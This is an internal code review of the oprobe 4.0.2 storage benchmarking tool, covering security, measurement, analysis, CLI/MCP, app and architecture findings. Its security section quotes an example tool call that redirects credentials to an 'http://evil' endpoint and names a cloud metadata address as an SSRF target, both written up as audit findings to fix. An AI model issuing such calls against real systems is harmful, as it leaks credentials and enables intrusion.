# oprobe 4.0.2 deep review: evidence for 5.0

Input to [v5.md](v5.md). Reviewed 2026-11-22 by five read-only reviews: measurement, analysis, agent/CLI, app, and architecture/security/strategy. Code locations are as of commit f99f1fa.

## S: Security

- **S1.** Default MCP (no `--allow-target`): `check_target` returns early (`mcp/tools.rs:1104`). `TargetIn` endpoint/options/proxy/insecure pass straight through (`tools.rs:40-63, 888-900`). An agent calling `sample_objects {target:"prod", endpoint:"http://evil"}` gets credentials sent to that host (a GCS bearer token, or a SigV4 key id plus replayable signatures). `probe_endpoint` is an SSRF vector (169.254.169.254).
- **S2.** The MCP HTTP transport has no authentication (`mcp/server.rs:279-346`). The Host allowlist only stops DNS rebinding. `--http-allow-remote` combined with `--allow-write` is open to anyone on the network. There are no connection limits or timeouts.
- **S3.** Untrusted text reaches the LLM without a marker: object keys appear in tool text (`tools.rs:2149-2156`), and server error bodies reach error messages.
- **S4.** `LabServer::spawn` binds any `--bind` address without a loopback check (`lab.rs:1446`). PUT bodies are buffered without a limit (`lab.rs:1240`).
- **S5.** `atomic_write` uses `File::create` (`store/mod.rs:102`), so config.toml holding inline secrets is written 0644. Redaction is by option name (`util.rs:213`).
- **S6.** The MCP server has no default budget. `plan_run` for 10 minutes was allowed at 1.14M requests and 411 GB; a 99-hour read-only run was accepted (121 TB).
- **S7.** Supply chain:
  - Actions are pinned by mutable tag, including `winget-releaser@v2` and `action-gh-release@v2`, which hold tokens.
  - rust-cache runs in release jobs.
  - There is no `cargo audit` or `cargo deny` job. `cargo audit`: RUSTSEC-2023-0071 (rsa via reqsign); unmaintained: bincode, chrono(nsh), rustybuzz, ttf-parser.
  - The installers check SHA256SUMS from the same origin and never verify the SLSA attestation.

## M: Measurement

- **M1.** Open loop (`engine/runner.rs:565-629`, `recorder.rs:1112`): at `--rate 1000 -c 4` on stragglers, 78 % of arrivals never started and were excluded from the percentiles. The backlog was attributed to "client processing 99 %"; the exit code was 0 and capacity advice was still printed. There is no schedule stage and no Poisson arrivals.
- **M2.** Sampling (`trace/log.rs:76-129`) keeps two independent reservoirs. Of 742 ops kept, none had all its requests and 182 had none. `http1_connections` reported "800 requests" for 4452. `exact_latency` switches off silently (`model/build.rs:43`).
- **M3.** Memory: a 120 s memory:// run plateaus at 624 MB RSS and peaks at 829 MB while saving (`store/runs.rs:101` encodes in memory). A lab run grows by about 1 KB per row (a network run reaches about 1-1.5 GB at the 1M cap). The App holds 788 MB for a 189k-request run (about 3.6 KB per request).
- **M4.** Upload "sent" means the bytes reached the kernel buffer (`fidelity.rs:560-600`, `dial.rs:83-97`). On an 8 MiB UploadPart against a no-delay lab, send was 24.8 ms and TTFB 36.7 ms.
- **M5.** HTTP/2:
  - The microscope transport uses one connection per host (`transport.rs:~210`). `sender.ready()` waits count as TTFB (`746-760`). The body goes as one frame (`339-366`).
  - In fidelity, waiters on a dial are counted as warm (`fidelity.rs:944-990`).
  - There are no stream-concurrency or flow-control metrics.
- **M6.** No lab scenario speaks HTTP/2. `--http h2` on lab://clean fails 100 % with no preflight message.
- **M7.** Client saturation is invisible: CPU is a 1 s average that includes warmup (`recorder.rs:913`), `rss_mib` is the peak (`procstat.rs:27`), and `client_cpu` is gated on the bottleneck already being "client" (`diagnosis.rs:298`). Runtime poll delay is counted as TTFB. There are no tokio metrics.
- **M8.** Overhead is about 9 µs per op on memory:// (95k vs 647k ops/s at c=1) and 9 % on 16 KiB lab GETs. Microscope runs 24 % faster than plain OpenDAL.
- **M9.** tcpinfo:
  - It reports smoothed rtt, which the server delay inflates; this is the root cause of AN-11.
  - min_rtt, notsent, lost, bytes_acked and pacing are read but dropped (`tcpinfo.rs:296-308`).
  - There is no Windows SIO_TCP_INFO.
  - `MAX_AGE` of 10 ms mis-attributes retransmits.
  - fidelity reports `wire_rx_bytes` as 0.
- **M10.** Server signals: no S3 error code from the body (SlowDown vs 503 vs InternalError), no x-amz-id-2, no region, no server-timing (`fidelity.rs:1015-1027`).
- **M11.** The timeline is 1 s buckets holding p50/p99 at 2 significant digits. There is no p99.9, max, in-flight, connection or CPU series. The heatmap is drawn from sampled rows and not rescaled (`build.rs:420`).
- **M12.** No per-key or per-prefix hot spots, no tail by object size, no cold vs warm split. Datasets use a single object size (`dataset.rs:162`).
- **M13.** OpenDAL features not used: prefetch/streaming reads, append, rename, versioning, conditional requests; the concurrent-limit, throttle, foyer, chaos and otel/prometheus/fastrace layers; the gcs-grpc, hdfs-native, alluxio, lakefs, hf and sftp services.
- **M14.** Workloads missing: log replay (S3 access logs, CloudTrail), consistency checks, ramp/step/diurnal shapes, multiple tenants, cross-region, Lance/Zarr/ORC/video ranges, versioned buckets, size distributions.
- **M15.** Warmup absorbs every dial, so connection-setup cost vanishes from short runs.

## A: Analysis

Faults were reproduced with a Python fault proxy in the scratchpad (`r5a/fproxy.py`).

- **A1.** A pure requests-per-second limit (proxy at 400 rps, c=16) was reported as an "in-flight ceiling ~3 → c≤2". Confidence was low, with 42.8 % misclassified. `rate_ceiling` was 399 but ignored (`capacity.rs:399-403,427`, `findings.rs:568`).
- **A2.** verify is one-sided (`verify.rs:387-440`): RPS lab −28 % and `fix` parquet −46 % were both "confirmed". On the queueing lab it predicted 1474 [1122, 1826] and measured 866, "confirmed", with p50 +76 %.
- **A3.** Prediction is linear in workers (`capacity.rs:558-600`). Retry backoff is counted as work, so it under-predicts (923 vs 1210, 50 vs 290); it over-predicts under queueing.
- **A4.** Headroom is a fixed 15 % in workers plus a hard 0.1 % budget. demo: c=24 measured clean twice, but c=20 was recommended (−15 %). parquet: c=4 against a feasible c=6 (−28 %) and against c=8 at 0.22 % with 2× the goodput.
- **A5.** "Rate ceiling" equals the observed throughput (`capacity.rs:485-503`). Random 5 % 503s gave the advice `--rate 762` (refuted); a noisy neighbour at 800/200 rps gave `--rate 256` (refuted, −50 %).
- **A6.** 5xx errors are hidden when a run also throttles (`findings.rs:653-657`).
- **A7.** No per-key or per-prefix throttle attribution. A hot key under zipf was reported as a "global rate limit". `cache_opportunity` was suppressed.
- **A8.** An aggregate bandwidth cap produced the advice "more parallel streams" (`diagnosis.rs:~374`).
- **A9.** `client_cpu` does not override the bottleneck: on one core at 94 % CPU the run was called "download-bound, add streams".
- **A10.** The tail was attributed to TTFB when 76 % was backoff; the attribution "error=none 91 % vs 75 %" is noise.
- **A11.** The tune search space covers concurrency, range_gap and io only, with no rate, max_inflight, h2 or backoff. It pools rows over `Window::all()` (`tune/mod.rs:326`), so the saved capacity has `window_s` 140010.
- **A12.** compare uses a t-interval on ratios with n=2 (`compare.rs:267-292`), producing CIs of [−201 %, +1.2 %] and "−100 % [−115, −85]".
- **A13.** The gate missed a real regression 3 of 3 times: server 8→10 ms gave p50 +13.5 % and ops −6.3 %, both significant, yet it passed because both threshold AND significance are required. Identical-run noise reaches −7.6 %. (A/A: 0 false positives in 15.)
- **A14.** The cost model has no storage classes, minimum sizes or durations, retrieval fees, egress tiers, free tiers or inter-region transfer, and the AWS egress note is wrong. List prices are OK (`cost.rs:28-110,394-425`).
- **A15.** `cache_opportunity` fires on oprobe's own 64-object dataset (`findings.rs:1499`).
- **Scorecard.** Right diagnosis and fix: in-flight limit (mostly), pool starvation, RTT, keep-alive. Wrong: rate limit, queueing, bandwidth, 5xx+throttle, noisy neighbour, hot key, client CPU. The lab can express only the in-flight fault.

## C: Agent, CLI and automation

- **C1.** MCP `tools/list` is 442 KB, 400 KB of it output schemas: four tools inline the 84 KB report schema (`mcp/server.rs:72-74`). Without them it is 41 KB.
- **C2.** `verify_finding` (80 s) and `recommend_config` (158 s) block, with no job or progress (`tools.rs:2184-2224`), and their schemas are AnyValue.
- **C3.** "Fix" means "go slower" without saying so: `fix` "confirmed" while MiB/s fell 583.7→249.1 (−59 %). Explain suggested c=4 at a predicted 79 ops/s when the run did 315.
- **C4.** The text brief is fixed at 80 columns and `cut()` truncates even off a TTY (`report/brief.rs:12`), so the advice and `next` commands are cut.
- **C5.** Throttle flags are stale or duplicated (`--max-throttle-rate` help at `args.rs:672-675`, versus `--max-throttle-ratio`). "1105 throttled · SLA met".
- **C6.** action.yml has no `--strict` (`:208`), so a non-comparable run passes. The data dir lives in `RUNNER_TEMP` (`:153`), so noise and capacity history are lost every job.
- **C7.** OTLP from watch: a new `oprobe.run.id` every window (`watch.rs:392`) causes series churn, there is no `service.instance.id`, no `OTEL_EXPORTER_OTLP_HEADERS` (`export/otlp.rs:449`), and it is JSON only.
- **C8.** Prometheus from watch: no target label, no build_info, no last-success timestamp, no /healthz, no HELP text (`watch.rs:267`).
- **C9.** `next` has gaps: no MCP call for target add, apply, or recommend. Error hints give CLI commands (`store/runs.rs:289`), and advice contains a literal `RUN`.
- **C10.** Response sizes: `get_run` 20.8 KB (`include_report` defaults to true, `tools.rs:1830`), `explain_run` 15 KB, `slowest` 61 KB. Content is duplicated between text and structured output. There is no detail level or pagination.
- **C11.** verify and fix child runs flood `runs list` and `last`: one `recommend_config` saved 16 runs (5.6 MB).
- **C12.** There is no Dockerfile, Helm chart or Grafana dashboard.
- **C13.** The CLI surface: 28 commands, `run` has 67 flags and `fix` 76, and `run --help` is 234 lines. Units in flag names are inconsistent. Completions are static.
- **C14.** Text glitches: "1 requests", "mib_per_s … mib_per_s", "now 38.6810", CI below −100 %, "+0.19pp limit … → pass". No i18n.

## U: App (GUI and TUI)

Measured: TUI first frame in 33-42 ms (103 ms with 200 runs), GUI 538 ms, switching tabs on a 189k run 75-140 ms, 788 MB RSS. Screenshots are in `scratchpad/r5u/gui*.png`.

- **U1.** Test Connection fails for every HTTP backend: `store.rs:1646` uses the bare `base_operator` (`engine/operator.rs:25`), which has no transport layer. The test covers only memory:// (`tests/ui.rs:589`).
- **U2.** Verify says "confirmed" while Compare says "regression", on one screen (throttling 4.58→0 %, ops −20.6 %). The finding predicted 915 against 1.48k.
- **U3.** Compare shows "same" for p99 +87.7 % (`status_label`, `analysis/compare.rs:516`). An inconclusive state is needed.
- **U4.** TUI charts: the 56 pt gutter clips labels (`chart.rs:92-96`: ".00k/s", "0.0 ms" for 10.0), axis labels collide, braille grids drown the data, legends have no swatches.
- **U5.** Focus traps: after Esc on the Inspector, focus returns to the filter field. The global `letter_key("enter")` (`shell.rs:280`) blocks Enter on buttons.
- **U6.** The palette: Export commands do nothing (Ctrl+S works). Matching is substring only, with no shortcuts and no reason shown for disabled commands.
- **U7.** No PgUp/PgDn/Home/End and no keyboard sort in Requests and Timeline (189k rows).
- **U8.** Timeline: "Fit" turns 10 ms ops into single dots, rows are in start order, and retry has no legend entry. There is no per-op waterfall.
- **U9.** Severity colours: errors 0.27 % in red against throttled 4.58 % in amber, under the verdict "critical throttling". retry and crit are nearly the same red. "Attention" vs "warning".
- **U10.** Run list rows read "● 00:16 ◇" with no date, preset or verdict, numbers are cut, and the id is repeated three times.
- **U11.** The TUI says "drop it on this window" and "⌘N"; ⌘ is hard-coded on Windows and Linux (`shell.rs:365-420`); icons are Unicode glyphs, not native symbols.
- **U12.** Machine ids and CLI text appear in the prose ("summary.ops_per_s:", "`oprobe analyze RUN …`", `[cost.pricing]`). Also "Measuring Measuring" and "MiB/s MiB/s".
- **U13.** TUI toasts draw over content (`shell.rs:1760`).
- **U14.** Live view: early numbers are noisy, there are no provisional findings, no notification at the end, and no ETA for tune.
- **U15.** The Linux .desktop file has no MimeType/%F and WiX registers no .oprobe association. The heatmap brush is mouse-only (`heatmap.rs:113`). Type sizes are fixed px (`kit.rs:91-137`). No l10n or RTL, no tray.

## X: Architecture, code health and strategy

- **X1.** The library API is not embeddable: lib.rs exports cli/mcp/ui as `pub`, and it is published to crates.io. The Recorder is tied to one run, and requests outside an op scope are recorded only while measuring, into shard 0 (`recorder.rs:646-658`). Split out an `oprobe-trace` crate.
- **X2.** There is no service layer: the UI and MCP build clap structs (`ui/launcher.rs`, `ui/store.rs`, `tools.rs:888`; 26 references to `crate::cli`), and 8 MCP tools spawn child processes (`tools.rs:1367`).
- **X3.** God files: `tools.rs` 2635 lines, `findings.rs` 2436, `html.rs` 2046, `config.rs` 2042, `shell.rs` 1932, `store.rs` 1743, `lab.rs` 1554, `diff.rs` 1550. The compare/gate logic lives in `report/diff.rs`. Four renderers plus the UI each walk the Report with no shared view model.
- **X4.** Two complete HTTP stacks (fidelity about 1100 lines, microscope about 1850 lines).
- **X5.** The binary is 74 MB (`.text` 55 MB); archives are about 30 MB and the dmg 66 MB. Contributors: nsh/syntect/rustybuzz, 18 services, aws-lc, rmcp. Startup is fine (11 ms).
- **X6.** Recorder hot path: the global `agg` mutex is taken several times per op, `verb.to_owned()` runs per op (`recorder.rs:752`), and there is a String method per request (`layers/trace.rs:57`).
- **X7.** CI cost: release builds on 4 OSes for every PR, 4 macOS jobs, no cancel-in-progress.
- **X8.** No tests: `lab.rs`, `cli/args.rs`, `cli/mod.rs`, `net/transport.rs`, `engine/runner.rs`, `compat`, `layers/trace.rs`, most of `ui/`. `tests/convergence.rs` retries 3 times; §12's tune ±1 and verify assertions are missing.
- **X9.** Competitors: warp (distributed, the de facto S3 benchmark), elbencho (HPC/GDS), COSBench, s3-benchmark, fio. AWS SDK/CRT OTel gives production truth, but only per SDK. oprobe's unique combination is client phase tracing, diagnosis with a verify loop, a CI gate, and MCP. Adoption blockers: 74 MB, unsigned, no stars, OpenDAL only, no distributed mode.
- **X10.** Bets:
  - an embeddable oprobe-trace layer emitting OTel;
  - replay of real traffic;
  - verified recommendations as the product, with a hardened MCP;
  - distributed mode and SDK parity;
  - a slimmed core plus a separate app, signed.
